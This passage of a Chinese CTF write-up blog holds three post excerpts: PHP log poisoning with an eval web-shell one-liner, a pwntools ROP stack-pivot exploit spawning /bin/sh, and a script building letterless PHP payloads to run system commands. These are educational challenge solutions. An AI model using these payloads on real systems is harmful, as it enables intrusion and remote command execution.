<p>可以看到日志文件位于<code>/var/log/nginx/</code>中   访问<code>/var/log/nginx/access.log</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">x.x.x.x - - [13/Oct/2023:11:18:25 +0000] &quot;GET / HTTP/1.1&quot; 200 1534 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span></span><br><span class="line"><span class="comment">x.x.x.x - - [13/Oct/2023:11:18:25 +0000] &quot;GET /?file=/etc/nginx/nginx.conf HTTP/1.1&quot; 200 1534 &quot;http://node5.anna.nssctf.cn:28888/&quot; &quot;Mozilla/5.0 (</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>可见成功include并获取日志内容  其中包括：IP， url路径，状态码和user-agent</p>
<p>那么有两种方式写入木马：</p>
<ol>
<li><p>url <code>?file=&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>  </p>
<p>注意这里如果直接浏览器改url部分字符会被编码，写入日志也是编码后的结果无法生效   因此需burp抓包修改</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x1.png?raw=true" alt="img"></p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x2.png?raw=true" alt="img"></p>
</li>
<li><p>user-agent</p>
<p>user-agent 直接用hackbar改也行  这里不用考虑编码问题</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x3.png?raw=true" alt="img"></p>
</li>
</ol>

	
	</div>
  <a type="button" href="/2023/10/13/HNCTF2022-easyInclude-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/10/dcquals2019-speedrun-wp/" >nightmare 7.2.1.dcquals2019-speedrun-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-10
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/17-stack_pivot/dcquals19_speedrun4">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec speedrun </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  IO_puts(<span class="string">&quot;how much do you have to say?&quot;</span>);</span><br><span class="line">  _libc_read(<span class="number">0</span>, buf, <span class="number">9uLL</span>);</span><br><span class="line">  buf[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  len = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> IO_puts(<span class="string">&quot;That&#x27;s not much to say.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">257</span> )</span><br><span class="line">    <span class="keyword">return</span> read_len((<span class="type">unsigned</span> <span class="type">int</span>)len);</span><br><span class="line">  <span class="keyword">return</span> IO_puts(<span class="string">&quot;That&#x27;s too much to say!.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果大小在1-257之内 则调用<code>read_len</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_len</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  IO_puts(<span class="string">&quot;Ok, what do you have to say for yourself?&quot;</span>);</span><br><span class="line">  _libc_read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;Interesting thought \&quot;%s\&quot;, I&#x27;ll take it into consideration.\n&quot;</span>,</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">int</span>)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buf长为256  明显可以溢出一个字节到<code>old_rbp</code>  从而利用stack pivot</p>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>将<code>old_rbp</code>最低位更改为0x00  进而ret后会跳转到0x08来执行  gdb调试分析发现多数情况下都在buf内部  也就是可以在buf内布置ROP然后跳转执行</p>
<p>但因为没法泄露  不知道具体的写入位置   可以通过多个<code>ret</code>来到达同样的地址执行ROP</p>
<p>因此也不是每次都能成功  有一定概率   依赖于栈顶地址</p>
<p>还有就是没有现成的<code>/bin/sh</code>  需要自己调用read函数写到bss段上然后利用</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./speedrun&quot;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./speedrun&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    set env DEBUG=1</span></span><br><span class="line"><span class="string">    b * 0x0000000000400BB4</span></span><br><span class="line"><span class="string">    # b * 0x0000000000400C7A</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400C46</span></span><br><span class="line">bss = <span class="number">0x6BB300</span></span><br><span class="line">syscall = <span class="number">0x000000000040132c</span></span><br><span class="line"></span><br><span class="line">rax_ret = <span class="number">0x0000000000415f04</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400686</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000410a93</span></span><br><span class="line">rdx_ret = <span class="number">0x000000000044a155</span></span><br><span class="line">rdx_rsi_ret = <span class="number">0x000000000044c6d9</span></span><br><span class="line">ret = <span class="number">0x0000000000400416</span></span><br><span class="line">read = <span class="number">0x000000000044A140</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;say?&#x27;</span>, <span class="string">b&#x27;257&#x27;</span>)</span><br><span class="line">payload = p64(ret) * <span class="number">13</span></span><br><span class="line">payload += p64(rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi_ret) + p64(<span class="number">8</span>) + p64(bss)</span><br><span class="line">payload += p64(read)</span><br><span class="line"></span><br><span class="line">payload += p64(rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(rdi_ret) + p64(bss) + p64(rdx_rsi_ret) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;yourself?&#x27;</span>, payload.ljust(<span class="number">257</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/10/10/dcquals2019-speedrun-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/10/极客大挑战2020-rceme-wp/" >极客大挑战2020-rceme-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-10
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2298">题目链接</a>   </p>
<p>源码提示有<code>swp</code>，访问<code>.index.php.swp</code>成功下载得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现有md5前5位比对校验，且当前<code>$_SESSION[&#39;code&#39;]</code>在页面中也有展现   因此可以爆破   然后就是无参函数构造了</p>
<blockquote>
<p>爆破哈希可以查看生日攻击：<a target="_blank" rel="noopener" href="http://ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html">哈希碰撞与生日攻击 - 阮一峰的网络日志 (ruanyifeng.com)</a></p>
<p>无参函数构造可见：<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/26/HNCTF2022-Canyource-wp/">https://antel0p3.github.io/2023/09/26/HNCTF2022-Canyource-wp/</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):		</span><br><span class="line">    ss = <span class="string">b&quot;[~&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += (<span class="number">255</span> - <span class="built_in">ord</span>(each)).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ss += <span class="string">b&quot;][~\xCF](&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ss</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_not</span>(<span class="params">a</span>):	<span class="comment"># 将命令转为[~\x8F\x8D\x96\x91\x8B\xA0\x8D][~\xCF]();的形式</span></span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">b&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">b&quot;;&quot;</span></span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28583/&#x27;</span></span><br><span class="line">sess = requests.session()	<span class="comment"># 注意这里用session()是为了保持会话状态</span></span><br><span class="line">res = sess.get(url=url)</span><br><span class="line"><span class="built_in">sum</span> = re.findall(<span class="string">&#x27;,0,5[)]==(.....)&#x27;</span>, res.text)[<span class="number">0</span>]	<span class="comment"># 获取5位哈希值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;</span>	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">800000</span>):	<span class="comment"># 爆破  不成功多试几次</span></span><br><span class="line">    md5 = hashlib.md5(<span class="built_in">str</span>(i).encode())</span><br><span class="line">    <span class="keyword">if</span> md5.hexdigest()[:<span class="number">5</span>] == <span class="built_in">sum</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        code = i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = sess.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;phpinfo();&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>成功获取到phpinfo结果  渲染后查看  <code>disabled_functions</code>中没有禁用函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = sess.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(getallheaders());&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># Array (</span></span><br><span class="line"><span class="comment">#    [Host] =&gt; node4.anna.nssctf.cn:28583</span></span><br><span class="line"><span class="comment">#    [User-Agent] =&gt; python-requests/2.31.0</span></span><br><span class="line"><span class="comment">#    ...)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls&quot;</span>&#125;	<span class="comment"># 这里放要执行的命令</span></span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(getallheaders());&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># Array (</span></span><br><span class="line"><span class="comment">#    [Host] =&gt; node4.anna.nssctf.cn:28583</span></span><br><span class="line"><span class="comment">#    [User-Agent] =&gt; ls</span></span><br><span class="line"><span class="comment">#    ...)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls&quot;</span>&#125;</span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(next(getallheaders()));&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># ls</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls /;cat /fll*&quot;</span>&#125;</span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;system(next(getallheaders()));&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># flll1114gggggg ...</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/10/10/极客大挑战2020-rceme-wp/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/3/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CVE/">CVE<span>8</span></a></li>
		
			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
		
			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
		
			<li><a href="/categories/pwn-wp/">pwn-wp<span>22</span></a></li>
		
			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
		
			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
		
			<li><a href="/categories/web-learning/">web-learning<span>7</span></a></li>
		
			<li><a href="/categories/web-wp/">web-wp<span>52</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/XXE/">XXE<span>2</span></a></li>
		
			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
		
			<li><a href="/tags/flask-session/">flask session<span>3</span></a></li>
		
			<li><a href="/tags/index/">index<span>1</span></a></li>
		
			<li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li>
		
			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
		
			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
		
			<li><a href="/tags/js/">js<span>1</span></a></li>
		
			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
		
			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
		
			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
		
			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
		
			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
		
			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
		
			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
		
			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
		
			<li><a href="/tags/vtable/">vtable<span>2</span></a></li>
		
			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
		
			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
		
			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
		
		
		   <li><a href="/tags">...<span>120</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2023/12/28/HGAME2023-SharedDiary-wp/" ><i class="fa fa-file-o"></i>HGAME2023-SharedDiary-wp</a>
      </li>
    
      <li>
        <a href="/2023/12/25/ejs原型链污染RCE/" ><i class="fa fa-file-o"></i>ejs原型链污染RCE</a>
      </li>
    
      <li>
        <a href="/2023/12/20/HGAME2023-Designer-wp/" ><i class="fa fa-file-o"></i>HGAME2023-Designer-wp</a>
      </li>
    
      <li>
        <a href="/2023/12/13/JAVA反序列化CC3/" ><i class="fa fa-file-o"></i>JAVA反序列化CC3</a>
      </li>
    
      <li>
        <a href="/2023/12/10/JAVA反序列化CC6/" ><i class="fa fa-file-o"></i>JAVA反序列化CC6</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer>  </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
